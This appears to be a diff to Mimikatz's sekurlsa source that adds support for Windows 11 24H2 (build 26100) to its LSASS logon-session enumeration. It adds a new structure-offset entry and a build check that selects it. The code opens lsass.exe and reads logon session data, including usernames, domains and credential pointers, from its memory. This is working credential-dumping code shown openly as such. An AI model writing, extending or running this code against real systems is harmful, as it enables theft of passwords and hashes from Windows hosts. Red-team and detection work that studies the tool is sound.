@@ -63,7 +63,9 @@ const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
 	{sizeof(KIWI_MSV1_0_LIST_61), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ, LogonServer)},
 	{sizeof(KIWI_MSV1_0_LIST_62), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_62, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_62, LogonServer)},
-	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},
+	{sizeof(KIWI_MSV1_0_LIST_63), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_63, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_63, LogonServer)},	
+	{sizeof(KIWI_MSV1_0_LIST_26100), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, Session), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_26100, LogonServer)},
+
 };
 
 const KUHL_M_SEKURLSA_LOCAL_HELPER lsassLocalHelpers[] = {
@@ -177,7 +179,9 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 		{
 			Type = KULL_M_MEMORY_TYPE_PROCESS;
 			if(kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
+			{
 				hData = OpenProcess(processRights, FALSE, pid);
+			}
 			else PRINT_ERROR(L"LSASS process not found (?)\n");
 		}
 
@@ -243,7 +247,7 @@ NTSTATUS kuhl_m_sekurlsa_acquireLSA()
 						kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_8);
 					#endif
 						kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion >= 6) || (cLsass.osContext.MinorVersion < 2);
-						kuhl_m_sekurlsa_cloudap_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1909);
+ 						kuhl_m_sekurlsa_cloudap_package.isValid = (cLsass.osContext.BuildNumber >= KULL_M_WIN_BUILD_10_1909);
 						if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) && kuhl_m_sekurlsa_msv_package.Module.isPresent)
 						{
 							kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
@@ -312,8 +316,11 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 			helper = &lsassEnumHelpers[3];
 		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
 			helper = &lsassEnumHelpers[5];
-		else
+		else if (cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_11_24H2)
 			helper = &lsassEnumHelpers[6];
+		else
+			helper = &lsassEnumHelpers[7];
+
 
 		if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
 			helper++; // yeah, really, I do that =)
@@ -321,6 +328,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 		securityStruct.hMemory = cLsass.hLsassMem;
 		if(securityStruct.address = LogonSessionListCount)
 			kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));
+
 
 		for(i = 0; i < nbListes; i++)
 		{
@@ -338,6 +346,7 @@ NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalDa
 					{
 						if(kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
 						{
+
 							sessionData.LogonId		= (PLUID)			((PBYTE) aBuffer.address + helper->offsetToLuid);
 							sessionData.LogonType	= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToLogonType));
 							sessionData.Session		= *((PULONG)		((PBYTE) aBuffer.address + helper->offsetToSession));
